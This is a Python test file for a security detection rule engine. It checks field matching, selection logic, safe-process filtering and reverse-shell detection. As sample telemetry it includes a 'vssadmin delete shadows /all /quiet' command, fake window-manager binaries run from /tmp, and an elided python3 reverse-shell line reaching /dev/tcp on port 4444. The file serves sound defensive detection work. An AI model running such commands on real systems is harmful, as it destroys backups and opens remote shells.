import pytest
from app.services.rule_engine import RuleEngine


def test_match_contains():
    engine = RuleEngine()
    event = {"cmdline": "powershell -enc ABC123"}
    assert engine._match_field("CommandLine|contains", "-enc", event) is True
    assert engine._match_field("CommandLine|contains", "-dec", event) is False


def test_match_endswith():
    engine = RuleEngine()
    event = {"exe": "/usr/bin/npm"}
    assert engine._match_field("Image|endswith", "npm", event) is True
    assert engine._match_field("process|endswith", "python", event) is False


def test_match_startswith():
    engine = RuleEngine()
    event = {"exe": "/usr/bin/python3"}
    assert engine._match_field("Image|startswith", "/usr/bin", event) is True
    assert engine._match_field("Image|startswith", "/tmp", event) is False


def test_selection_and_logic():
    engine = RuleEngine()
    selection = {
        "Image|endswith": "bash",
        "ParentImage|endswith": "npm"
    }
    event = {"exe": "/usr/bin/bash", "parent_exe": "/usr/bin/npm"}
    assert engine._match_selection(selection, event) is True

    # Failed parent
    event_bad = {"exe": "/usr/bin/bash", "parent_exe": "/usr/bin/systemd"}
    assert engine._match_selection(selection, event_bad) is False


def test_selection_or_logic_for_list():
    engine = RuleEngine()
    selection = {
        "CommandLine|contains": ["-enc", "-encodedcommand"]
    }
    assert engine._match_selection(selection, {"cmdline": "powershell -enc aaaa"}) is True
    assert engine._match_selection(selection, {"cmdline": "powershell -encodedcommand aaaa"}) is True
    assert engine._match_selection(selection, {"cmdline": "powershell -ExecutionPolicy Bypass"}) is False


def test_evaluate_rule_against_telemetry():
    engine = RuleEngine()
    rule = {
        "id": "test-rule-1",
        "rule_name": "Detect Shadow Copy Deletion",
        "severity": "high",
        "mitre_techniques": ["T1490"],
        "detection": {
            "selection": {
                "process|endswith": "vssadmin.exe",
                "cmdline|contains": "delete shadows"
            }
        },
        "logsource": {"category": "process_creation"}
    }
    telemetry = {
        "agent_id": "test-agent",
        "process_list": [
            {"name": "vssadmin.exe", "exe": "C:\\Windows\\System32\\vssadmin.exe", "cmdline": "vssadmin delete shadows /all /quiet"},
            {"name": "notepad.exe", "exe": "C:\\Windows\\notepad.exe", "cmdline": "notepad.exe text.txt"}
        ]
    }
    matches = engine._evaluate_rule(rule, telemetry)
    assert len(matches) == 1
    assert matches[0].rule_id == "test-rule-1"
    assert matches[0].rule_name == "Detect Shadow Copy Deletion"
    assert matches[0].severity == "high"


def test_safe_processes_skips_xfwm4_and_systemd():
    from app.services.rule_engine import is_safe_process, SAFE_PROCESSES
    engine = RuleEngine()

    assert "xfwm4" in SAFE_PROCESSES
    assert "systemd" in SAFE_PROCESSES

    # xfwm4 in legitimate location -> safe
    safe_proc = {"name": "xfwm4", "exe": "/usr/bin/xfwm4", "cmdline": "xfwm4 --sm-client-id 123"}
    assert is_safe_process(safe_proc) is True

    # xfwm4 in /tmp -> NOT safe (suspicious directory)
    mal_proc_tmp = {"name": "xfwm4", "exe": "/tmp/xfwm4", "cmdline": "/tmp/xfwm4"}
    assert is_safe_process(mal_proc_tmp) is False

    # xfwm4 in /dev/shm -> NOT safe
    mal_proc_shm = {"name": "xfwm4", "exe": "/dev/shm/xfwm4", "cmdline": "/dev/shm/xfwm4"}
    assert is_safe_process(mal_proc_shm) is False


def test_rule_eval_skips_safe_process_xfwm4():
    engine = RuleEngine()
    rule = {
        "id": "rule-orphan",
        "rule_name": "Suspicious Window Manager",
        "severity": "medium",
        "mitre_techniques": ["T1059"],
        "detection": {
            "selection": {
                "process|endswith": "xfwm4"
            }
        },
        "logsource": {"category": "process_creation"}
    }
    # Legitimate xfwm4 in /usr/bin -> filtered out
    telemetry_safe = {
        "agent_id": "test-agent",
        "process_list": [
            {"name": "xfwm4", "exe": "/usr/bin/xfwm4", "cmdline": "xfwm4"}
        ]
    }
    matches = engine._evaluate_rule(rule, telemetry_safe)
    assert len(matches) == 0

    # Malicious fake xfwm4 running from /tmp -> NOT filtered
    telemetry_mal = {
        "agent_id": "test-agent",
        "process_list": [
            {"name": "xfwm4", "exe": "/tmp/xfwm4", "cmdline": "/tmp/xfwm4"}
        ]
    }
    matches_mal = engine._evaluate_rule(rule, telemetry_mal)
    assert len(matches_mal) == 1


def test_missing_parent_does_not_match():
    engine = RuleEngine()
    # Missing parent_pid or parent_exe should return False
    event_no_parent = {"exe": "/usr/bin/xfwm4", "parent_pid": None, "parent_exe": None}
    assert engine._match_field("parent_pid", 1, event_no_parent) is False
    assert engine._match_field("parent_exe|endswith", "lightdm", event_no_parent) is False
    assert engine._match_field("parent_pid", 0, {"parent_pid": 0}) is False


def test_safe_processes_python3_flask_and_node():
    from app.services.rule_engine import is_safe_process, SAFE_PROCESSES, is_suspicious_for_t1071

    expected_safe = ['python3', 'python', 'node', 'bash', 'sh', 'xfwm4', 'systemd', 'dbus-daemon', 'xfce4-panel']
    for p in expected_safe:
        assert p in SAFE_PROCESSES

    # Flask python3 in venv -> safe!
    flask_proc = {
        "name": "python3",
        "exe": "/home/webuser/vulnerable_web/venv/bin/python3",
        "cmdline": "/home/webuser/vulnerable_web/venv/bin/python3 /home/webuser/vulnerable_web/app.py",
        "parent_pid": 1
    }
    assert is_safe_process(flask_proc) is True
    assert is_suspicious_for_t1071(flask_proc) is False

    # Node.js app -> safe
    node_proc = {
        "name": "node",
        "exe": "/usr/bin/node",
        "cmdline": "node server.js"
    }
    assert is_safe_process(node_proc) is True
    assert is_suspicious_for_t1071(node_proc) is False

    # Malicious reverse shell python3 -> is_suspicious_for_t1071 is True
    mal_proc = {
        "name": "python3",
        "exe": "/usr/bin/python3",
        "cmdline": "python3 -c 'import socket; ...; /dev/tcp/1.2.3.4/4444'"
    }
    assert is_suspicious_for_t1071(mal_proc) is True


def test_parent_pid_low_not_traced():
    engine = RuleEngine()
    # PID < 100 and != 1 should return False
    assert engine._match_field("parent_pid", 500, {"parent_pid": 2}) is False
    # PID 1 matching PID 1 is allowed
    assert engine._match_field("parent_pid", 1, {"parent_pid": 1}) is True


